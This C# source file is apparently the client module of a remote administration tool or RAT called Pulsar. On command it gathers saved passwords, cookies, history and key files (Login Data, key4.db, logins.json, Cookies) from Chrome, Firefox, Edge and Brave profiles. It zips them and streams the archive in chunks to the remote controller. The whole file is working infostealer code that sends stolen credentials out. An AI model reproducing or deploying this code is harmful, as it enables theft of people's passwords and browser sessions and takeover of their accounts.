using Pulsar.Client.Networking;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Administration.FileManager;
using Pulsar.Common.Messages.Browser;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Models;
using Pulsar.Common.Networking;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Threading.Tasks;

namespace Pulsar.Client.Messages
{
    public class BrowserExtractionHandler : IMessageProcessor
    {
        private readonly PulsarClient _client;

        public BrowserExtractionHandler(PulsarClient client)
        {
            _client = client;
        }

        public bool CanExecute(IMessage message) => message is ExtractAllBrowsersRequest;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case ExtractAllBrowsersRequest msg:
                    HandleExtractAllBrowsers(sender, msg);
                    break;
            }
        }

        private void HandleExtractAllBrowsers(ISender sender, ExtractAllBrowsersRequest request)
        {
            Task.Run(async () =>
            {
                try
                {
                    var transferId = request.TransferId;
                    var tempZipPath = Path.Combine(Path.GetTempPath(), "Pulsar", $"{transferId}.zip");
                    var tempDir = Path.GetDirectoryName(tempZipPath);

                    // Ensure temp directory exists
                    if (!Directory.Exists(tempDir))
                        Directory.CreateDirectory(tempDir);

                    int browserCount = 0;

                    // Create ZIP with all browser data
                    using (var zip = ZipFile.Open(tempZipPath, ZipArchiveMode.Create))
                    {
                        if (ExtractChrome(zip)) browserCount++;
                        if (ExtractFirefox(zip)) browserCount++;
                        if (ExtractEdge(zip)) browserCount++;
                        if (ExtractBrave(zip)) browserCount++;
                    }

                    var fileInfo = new FileInfo(tempZipPath);
                    var response = new ExtractAllBrowsersResponse
                    {
                        TransferId = transferId,
                        ZipFileName = $"AllBrowsers_{DateTime.Now:yyyyMMdd_HHmmss}.zip",
                        FileSize = fileInfo.Length,
                        BrowsersExtracted = browserCount,
                        Error = null
                    };

                    // Send response
                    sender.Send(response);

                    // Initiate file transfer
                    await InitiateFileTransferAsync(sender, tempZipPath, response.ZipFileName);

                    // Cleanup
                    try { File.Delete(tempZipPath); } catch { }
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"Browser extraction error: {ex.Message}");
                    sender.Send(new ExtractAllBrowsersResponse
                    {
                        TransferId = request.TransferId,
                        Error = ex.Message
                    });
                }
            });
        }

        private bool ExtractChrome(ZipArchive zip)
        {
            try
            {
                var chromeDataPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Google", "Chrome", "User Data");

                if (!Directory.Exists(chromeDataPath)) return false;

                bool found = false;
                var chromePath = "Chrome";
                foreach (var profile in Directory.GetDirectories(chromeDataPath))
                {
                    var profileName = Path.GetFileName(profile);
                    if (ExtractBrowserProfile(zip, profile, $"{chromePath}/{profileName}"))
                        found = true;
                }

                return found;
            }
            catch
            {
                return false;
            }
        }

        private bool ExtractFirefox(ZipArchive zip)
        {
            try
            {
                var firefoxDataPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "Mozilla", "Firefox", "Profiles");

                if (!Directory.Exists(firefoxDataPath)) return false;

                bool found = false;
                var firefoxPath = "Firefox";
                foreach (var profile in Directory.GetDirectories(firefoxDataPath))
                {
                    var profileName = Path.GetFileName(profile);
                    if (ExtractBrowserProfile(zip, profile, $"{firefoxPath}/{profileName}"))
                        found = true;
                }

                return found;
            }
            catch
            {
                return false;
            }
        }

        private bool ExtractEdge(ZipArchive zip)
        {
            try
            {
                var edgeDataPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Microsoft", "Edge", "User Data");

                if (!Directory.Exists(edgeDataPath)) return false;

                bool found = false;
                var edgePath = "Edge";
                foreach (var profile in Directory.GetDirectories(edgeDataPath))
                {
                    var profileName = Path.GetFileName(profile);
                    if (ExtractBrowserProfile(zip, profile, $"{edgePath}/{profileName}"))
                        found = true;
                }

                return found;
            }
            catch
            {
                return false;
            }
        }

        private bool ExtractBrave(ZipArchive zip)
        {
            try
            {
                var braveDataPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "BraveSoftware", "Brave-Browser", "User Data");

                if (!Directory.Exists(braveDataPath)) return false;

                bool found = false;
                var bravePath = "Brave";
                foreach (var profile in Directory.GetDirectories(braveDataPath))
                {
                    var profileName = Path.GetFileName(profile);
                    if (ExtractBrowserProfile(zip, profile, $"{bravePath}/{profileName}"))
                        found = true;
                }

                return found;
            }
            catch
            {
                return false;
            }
        }

        private bool ExtractBrowserProfile(ZipArchive zip, string profilePath, string zipPrefix)
        {
            var filesToExtract = new[] 
            { 
                "Cookies",
                "History",
                "Bookmarks",
                "Login Data",
                "Bookmarks.bak",
                "Preferences",
                "places.sqlite",
                "key4.db",
                "logins.json"
            };

            bool extracted = false;
            foreach (var file in filesToExtract)
            {
                var filePath = Path.Combine(profilePath, file);
                if (File.Exists(filePath))
                {
                    try
                    {
                        zip.CreateEntryFromFile(filePath, $"{zipPrefix}/{file}");
                        extracted = true;
                    }
                    catch
                    {
                        // File locked or permission denied, skip
                    }
                }
            }

            return extracted;
        }

        private async Task InitiateFileTransferAsync(ISender sender, string filePath, string fileName)
        {
            const int ChunkSize = 1024 * 64; // 64 KB chunks
            var fileInfo = new FileInfo(filePath);
            int transferId = new Random().Next(1000, int.MaxValue);

            try
            {
                // Send initial FileTransferRequest
                sender.Send(new FileTransferRequest
                {
                    Id = transferId,
                    RemotePath = fileName
                });

                // Send file in chunks
                using (var fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
                {
                    byte[] buffer = new byte[ChunkSize];
                    int bytesRead;
                    long totalRead = 0;

                    while ((bytesRead = await fileStream.ReadAsync(buffer, 0, buffer.Length)) > 0)
                    {
                        var chunk = new byte[bytesRead];
                        Array.Copy(buffer, chunk, bytesRead);

                        sender.Send(new FileTransferChunk
                        {
                            Id = transferId,
                            FilePath = fileName,
                            FileSize = fileInfo.Length,
                            Chunk = new FileChunk
                            {
                                Offset = totalRead,
                                Data = chunk
                            },
                            FileExtension = ".zip"
                        });

                        totalRead += bytesRead;
                    }
                }

                // Send completion
                sender.Send(new FileTransferComplete
                {
                    Id = transferId,
                    FilePath = fileName
                });
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"File transfer error: {ex.Message}");
            }
        }
    }
}
